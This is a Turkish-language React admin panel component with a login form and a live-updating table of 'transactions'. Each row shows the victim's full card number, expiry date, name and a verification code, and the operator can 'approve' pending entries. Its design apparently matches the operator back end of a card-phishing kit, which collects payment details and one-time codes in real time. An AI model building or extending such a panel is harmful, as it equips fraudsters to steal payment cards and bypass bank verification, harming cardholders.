"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

interface Transaction {
  id: string
  kartNumarasi: string
  sonKullanmaTarihi: string
  adSoyad: string
  dogrulamaTipi?: string
  dogrulamaKodu?: string
  timestamp: string
  status: string
}

export default function AdminPanel() {
  const [transactions, setTransactions] = useState<Transaction[]>([])
  const [isAdmin, setIsAdmin] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")

  useEffect(() => {
    if (isAdmin) {
      // SSE bağlantısını kur
      const eventSource = new EventSource("/api/transactions?stream=true")

      eventSource.onmessage = (event) => {
        const data = JSON.parse(event.data)
        setTransactions(Array.isArray(data) ? data : [data])
      }

      return () => eventSource.close()
    }
  }, [isAdmin])

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    try {
      const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      })
      const data = await response.json()
      if (data.success) {
        setIsAdmin(true)
        setError("")
      } else {
        setError("Geçersiz kullanıcı adı veya şifre")
      }
    } catch (error) {
      setError("Giriş yapılırken bir hata oluştu")
    }
  }

  const handleApprove = async (id: string) => {
    try {
      const response = await fetch(`/api/transactions/${id}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ status: "onaylandı" }),
      })
      if (!response.ok) {
        throw new Error("İşlem onaylanamadı")
      }
    } catch (error) {
      console.error("İşlem onaylanırken hata oluştu:", error)
    }
  }

  if (!isAdmin) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen">
        <h1 className="text-2xl font-bold mb-4">Admin Paneli</h1>
        <form onSubmit={handleAdminLogin} className="space-y-4">
          <div>
            <Label htmlFor="username">Kullanıcı Adı</Label>
            <Input id="username" type="text" value={username} onChange={(e) => setUsername(e.target.value)} required />
          </div>
          <div>
            <Label htmlFor="password">Şifre</Label>
            <Input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          {error && <p className="text-red-500">{error}</p>}
          <Button type="submit">Giriş Yap</Button>
        </form>
      </div>
    )
  }

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-2xl font-bold mb-4">Admin Paneli</h1>
      <Card>
        <CardHeader>
          <CardTitle>İşlem Geçmişi</CardTitle>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>İşlem ID</TableHead>
                <TableHead>Kart Numarası</TableHead>
                <TableHead>Son Kullanma Tarihi</TableHead>
                <TableHead>İsim</TableHead>
                <TableHead>Doğrulama Tipi</TableHead>
                <TableHead>Doğrulama Kodu</TableHead>
                <TableHead>Tarih</TableHead>
                <TableHead>Durum</TableHead>
                <TableHead>İşlem</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {transactions.map((transaction) => (
                <TableRow key={transaction.id}>
                  <TableCell>{transaction.id}</TableCell>
                  <TableCell>{transaction.kartNumarasi}</TableCell>
                  <TableCell>{transaction.sonKullanmaTarihi}</TableCell>
                  <TableCell>{transaction.adSoyad}</TableCell>
                  <TableCell>{transaction.dogrulamaTipi || "-"}</TableCell>
                  <TableCell>{transaction.dogrulamaKodu || "-"}</TableCell>
                  <TableCell>{new Date(transaction.timestamp).toLocaleString()}</TableCell>
                  <TableCell>{transaction.status}</TableCell>
                  <TableCell>
                    {transaction.status === "beklemede" && (
                      <Button onClick={() => handleApprove(transaction.id)}>Onayla</Button>
                    )}
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  )
}

